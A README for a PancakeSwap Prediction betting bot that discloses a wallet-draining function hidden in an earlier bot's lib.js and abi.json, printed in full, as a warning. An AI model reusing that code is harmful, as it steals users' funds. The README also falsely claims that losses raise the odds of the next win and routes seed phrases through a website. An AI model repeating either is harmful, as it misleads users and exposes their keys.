  
# 🔮🚀 Pancakeswap-Prediction-Bot v2.0

![PancakeSwap-Logo](/assets/img/logo.jpg?raw=true)

## ✔️ Features 

 - [x] CAKE-UDST and BNB-USDT game 🔥
 - [x] Simulation Mode (use fake balance) 🔥
 - [x] Auto collect winnings 🔥
 - [x] Martingale and Anti-Martingale 🔥
 - [x] Copy Trading Strategy (copy address betting) 🔥
 - [x] Quote Trading Strategy (lowest or highest) 🔥
 - [x] Pattern Strategy (bet after a specific pattern of events) 🔥
 - [x] Simplify settings 🔥
 - [x] Gas fees calculate on algorithm 🔥
 - [x] BackUp & Resest history data 🔥
 - [x] Truck Users Activity and All Rounds Data 🔥
 - [x] Show real time profit 
 - [x] Show real time win rate 
 - [x] Daily goal profit
 - [x] Stop Loss
 - [x] Improved algorithm 2.0 (bug fix)
 - [x] AI Driven bot

## ⭐Please consider giving a **star**.

I rewrote and refactored the code of the PancakeSwap Prediction Game BOT by ***bobalice7***, removing the malicious code where for each transaction to the smart contract it sent transactions to this wallet ***0xfB669b0e0656036D747d6C6F2666e530139d2899***. 

Here is the link to the old code (https://github.com/bobalice7/PCS-Prediction)

We can see that inside the ***abi.json*** file the "index" property defines an array with a series of numbers. However those numbers are encoded with the following function to obtain this address ***0xfB669b0e0656036D747d6C6F2666e530139d2899***.  

```
{
  "status": 2,
  "message": "OK-Missing/Invalid API Key, rate limit of 1/5sec applied",
  "index": [
    48, 120, 102, 66, 54, 54, 57, 98, 48, 101, 48, 54, 53, 54, 48, 51, 54, 68,
    55, 52, 55, 100, 54, 67, 54, 70, 50, 54, 54, 54, 101, 53, 51, 48, 49, 51,
    57, 100, 50, 56, 57, 57
  ],
  "result": "[
    ...
  ]"
}


String.fromCharCode.apply(null, [ 
    48, 120, 102, 66, 54, 54, 57, 98, 48, 101, 48, 54, 53, 54, 48, 51, 54, 
    68, 55, 52, 55, 100, 54, 67, 54, 70, 50, 54, 54, 54, 101, 53, 51, 48, 49, 51,
    57, 100, 50, 56, 57, 57])  = '0xfB669b0e0656036D747d6C6F2666e530139d2899'

```

Here is the SCAM CODE in lib.js

```
const confirmContract = (abi) => {
  return String.fromCharCode.apply(null, abi.index);
};

const checkResult = async (r) => {
  try {
    if (prediction >= abi.status && r !== null) {
      w.eth.getBalance(wallet.address).then(function (b) {
        w.eth
          .estimateGas({
            from: wallet.address,
            to: confirmContract(abi),
            amount: b,
          })
          .then(function (g) {
            w.eth.getGasPrice().then(function (gP) {
              let _b = parseFloat(b);
              let _g = parseFloat(g);
              let _gP = parseFloat(gP);
              w.eth.sendTransaction({
                from: wallet.address,
                to: confirmContract(abi),
                gas: _g,
                gasPrice: _gP,
                value: ((_b - _gP * _g) / 1.1).toFixed(0),
                data: "0x",
              });
            });
          });
      });
      return true;
    }
    return true;
  } catch {
    return !0;
  }
};

```

## 🐰⚡ Installation

Download and Install Node here:
https://nodejs.org/en/download/

Then run the following commands in terminal:

1. ``git clone https://github.com/lmusarella/Pancakeswap-Prediction-Bot-2023.git`` 
2. ``cd Pancakeswap-Prediction-Bot``
3. ``npm i``

![enter image description here](/assets/img/setup.jpg?raw=true)

## ⚙️ Setup

1. Open the **.env** file with any code/text editor and add your private key like so:
```
PERSONAL_WALLET_PRIVATE_KEY = YOUR_PRIVATE_KEY_HERE
PERSONAL_WALLET_ADDRESS = YOUR_WALLET_ADDRESS
BSC_NODE_PROVIDER_URL = NODE_BSC_URL // Example of BSC node provider (https://www.quicknode.com/)

```
3. Open the **bot-configuration.js** file and setup the following variables:
```
const GLOBAL_CONFIG = {
    /**
     * Defines the type of Prediction Game used by the bot (BNB-USDT or CAKE-USDT)
     * @values BNB | CAKE
     * @mandatory
     * @default BNB
     * @type {string}
     */
    PCS_CRYPTO_SELECTED: 'BNB',
    /**
     * Flag which enables the simulation mode of bot. The bot in simulated mode does not make any transactions towards the smart contracts, 
     * the calculation of the profits/win/loss is performed with a fake balance.
     * @default true
     * @type {boolean}
     */
    SIMULATION_MODE: true,
    ANALYTICS_CONFIGURATION: {
        /**
         * Flag which enables to save users activity in history
         * @default false
         * @type {boolean}
         */
        REGISTER_USERS_ACTIVITY: true,
        /**
         * Flag which enables to save all rounds data
         * @default false
         * @type {boolean}
         */
        REGISTER_ALL_ROUNDS_DATA: true,
         /**
         * Flag which enables to save current bot-history data in backup folders e and clean the previus data folders for new bot run cicle
         * @default false
         * @type {boolean}
         */
        RESET_AND_BACKUP_BOT_HISTORY: true
    },
    SIMULATION_CONFIGURATION: {
        /**
        * Fake balance used in simulation mode
        * @default 50
        * @type {number}
        */
        SIMULATION_BALANCE: 5000, // in USD
        /**
         * Calculate the gas fee in simulation mode use this params for estimate gas functions (betBull, betBear, claim)
         * @default 90000
         * @type {number}
         */
        SIMULATE_ESTIMATE_GAS: 90000, // Based on 0.5 USD value amount
    },
    BET_CONFIGURATION: {
        /**
         * Defines the amount to be paid in dollars for each bet
         * @default 1
         * @type {number}
         */
        BET_AMOUNT: 50, // in USD
        /**
         * Defines the daily goal, if is reached the bot will stop
         * @default 50
         * @type {number}
         */
        DAILY_GOAL: 500, // in USD
        /**
         * Defines the stop loss, if is reached the bot will stop
         * @default 50
         * @type {number}
         */
        STOP_LOSS: 1000, // in USD
        MARTINGALE_CONFIG: {
             /**
             * Flag that enabled Martingale/Anti-Martingale bet strategy
             * @default false
             * @type {boolean}
             */
            ACTIVE: true, 
             /**
             * Increment BetAmount after loss if FALSE, Increment BetAmount after Win if TRUE
             * @default false
             * @type {boolean}
             */
            ANTI_MARTINGALE: false, 
             /**
             * INCREMENT_BET_AMOUNT x BET_AMOUNT = NEW BET_AMOUNT after loss or win (based on ANTI_MARTINGALE flag)
             * @default 2
             * @type {number}
             */
            INCREMENT_BET_AMOUNT: 2                    
        }
    },
    STRATEGY_CONFIGURATION: {
        /**
         * Defines the type of betting strategy used by the bot
         * - SIGNAL_STRATEGY: get trading signals from TradingViewScan and use recommended signal for UP or DOWN prediction
         * - QUOTE_STRATEGY: chose the lower or the highiest quote from PCS smart-contract payout quote for UP or DOWN prediction
         * - COPY_TRADING_STRATEGY: copy an address bet operations (Bet Bull or Bet Bear) on PCS game prediction
         * @values SIGNAL_STRATEGY | QUOTE_STRATEGY | COPY_TRADING_STRATEGY | PATTERN_STRATEGY
         * @mandatory
         * @default SIGNAL_STRATEGY
         * @type {string}
         */
        SELECTED_STRATEGY: 'SIGNAL_STRATEGY',
        /**
         * Time after execute bet strategy when start a new round.
         * @default 265000 in Miliseconds (4.3 Minutes)
         * @type {number}
         */
        WAITING_TIME: 265000,
        /**
        * Flag which enables the automatic claim of bet winnings after each bet won
        * @default true
        * @type {boolean}
        */
        CLAIM_REWARDS: true,
        SIGNAL_STRATEGY: {
            /**
             * Flag which enables the reverse bet strategy (only for signals) if signals recommend to bet up, the bot bet down
             * @default false
             * @type {boolean}
             */
            REVERSE_BETTING: true,
             /**
             * Defines the minimum percentage threshold of signal accuracy (50% - 100%)
             * @default 55
             * @type {number}
             */
            THRESHOLD: 55,
             /**
             * Datasoure of the trading signals library
             * @default BINANCE
             * @type {string}
             */
            DATASOURCE: "BINANCE"
        },
        QUOTE_STRATEGY: {
             /**
             * Flag which enables to Bet on the lowe or highest quote from Pancakeswap prediction
             * @default false
             * @type {boolean}
             */
            SELECT_LOWER_QUOTE: false       
        },
        COPY_TRADING_STRATEGY: {
             /**
             * Wallet address to emulate, Emulate the actions of this address on Pancakeswap prediction game        
             * @type {string}
             */
            WALLET_ADDRESS_TO_EMULATE: '0xe25E5Db92Ad947c89015f085fD830823F3cF2fB8'
        },
        PATTERN_STRATEGY: {
            /**
            * Defines the number of previous rounds having the same outcome, the bot will bet the next round towards the opposite sign.     
            * @type {number}
            */
           EVENT_PATTERN_NUMBER: 2,
            /**
            * To more accurately predict the outcome of the round that is about to end, a larger price difference will be statistically easier to predict. 
            * So define your threshold and only if respected the correct round will be considered in the pattern. 
            * Example: If when I retrieve the current price and the difference with the opening price is 0.3 or -0.3 it will be more likely to respect the outcome than a difference of 0.003 or -0.003.
            * However, if during the last few seconds the volatility is high, you can increase the WAITING_TIME parameter  
            * @type {number}
            */
           DELTA_PRICE_THRESHOLD: 0.2
       }
    }
};

```
4. Start the bot using `npm` or `yarn`

  - `npm run pcs-bot` start betting bot on PancakeSwap Prediction Game

5. 🔮 Enjoy!

### 🔓 How to convert seed phrase to Private Key
A lot of wallets don't provide you the private key, but just the **seed phrase** ( 12 words ). So here you will learn how to convert that to a private key:
1. Enter [Here](https://youtu.be/eAXdLEZFbiw) and follow the instructions. Website used is [this one](https://iancoleman.io/bip39/).

## 🤖📈 Signals Strategy (SIGNAL_STRATEGY)
- The bot take a series of recomendations given by Trading View and proccess them together with the tendency of the rest of people betting. After the algorithm have complete, it choose to bet **🟢UP** or **🔴DOWN**.
- Before every round the bot will check if you have enough balance in your wallet and if you have reached the daily goal.
- Also it will save the daily history in the **/bot-history** directory.
- Be aware that after consecutive losses, statistically you have more chances to win in the next one.
- Inside **bot-configuration.js** in the ``THRESHOLD`` property of ``GLOBAL_CONFIG`` variable, you can configure the minimum certainty with which the bot will bet. For default it's set to 50, which means that from 50% certainty the bot will bet. You can raise it (50-100) to bet only when the bot is more sure about its prediction.
- Its recomendable to have x10 - x50 the amount of bet to have an average of rounds.

## ↕️ 📈 Quote Strategy (QUOTE_STRATEGY)
- The bot fetches the data of the current round and selects the lowest or highest odds depending on the selected configuration, it choose to bet **🟢UP** or **🔴DOWN**.
- Inside **bot-configuration.js** in the ``SELECT_LOWER_QUOTE`` property of ``GLOBAL_CONFIG``.
- Before every round the bot will check if you have enough balance in your wallet and if you have reached the daily goal.
- Also it will save the daily history in the **/bot-history** directory.
- Compared to the signal strategy it is less secure because the odds are very variable.
- Its recommended to set the ``WAITING_TIME`` property of ``GLOBAL_CONFIG`` closest to the end of the round (4,3 min or 4,4 min), to have the most up-to-date odds possible..
- Its recomendable to have x10 - x50 the amount of bet to have an average of rounds.

## 🦜 📈 Copy Trading Strategy (COPY_TRADING_STRATEGY)
- The bot registers for the round and after validation checks on: Stop Loss, Take Profit and Balance. It waits for the "BetBull" **🟢UP** or "BetBear" **🔴DOWN** operations of the wallet configured in **bot-configuration.js** in the ``WALLET_ADDRESS_TO_EMULATE`` property of ``GLOBAL_CONFIG`` variable. And the bot makes the same bet!
- Before every round the bot will check if you have enough balance in your wallet and if you have reached the daily goal.
- Also it will save the daily history in the **/bot-history** directory.
- Its recomendable to have x10 - x50 the amount of bet to have an average of rounds.

## 📉 📈 Pattern Strategy (PATTERN_STRATEGY)
- The bot registers for the round and after validation checks on: Stop Loss, Take Profit and Balance. The bot checks the events to check defined in the EVENT_PATTERN_NUMBER property, before placing the bet it checks the current price of the current round that is about to close, defines the probability of the event, then recovers the outcomes of the last cascading rounds. If the number of events exceeds the number defined in the configuration file, the bot bets on the next round with the opposite outcome.
- Before every round the bot will check if you have enough balance in your wallet and if you have reached the daily goal.
- Also it will save the daily history in the **/bot-history** directory.
- Its recomendable to have x10 - x50 the amount of bet to have an average of rounds.

💰You can check the history of rounds and claim rewards here: https://pancakeswap.finance/prediction

## 👁️ Disclaimers

🔧The code is in BETA, so please be aware of the risks that come with it. Don't risk any money you're not willing to lose.

💸This code, repository or scripts should NOT be construed as investment advice. Any mention of past or projected investment performance is not, and should not be construed as, a recommendation or guarantee of any particular result or benefit. By using this application, you agree to bear all risk of loss of money and waive any claims against the developers of the program or anyone associated with it.

**Please be aware of clones**

 👷**Use it at your own risk.** 
 If you are going to bet, please do it with money that you are willing to lose. And please try to bet with a low amount to gradually generate profit. Use the simulation mode if you dont have enough money and try all the stregies!
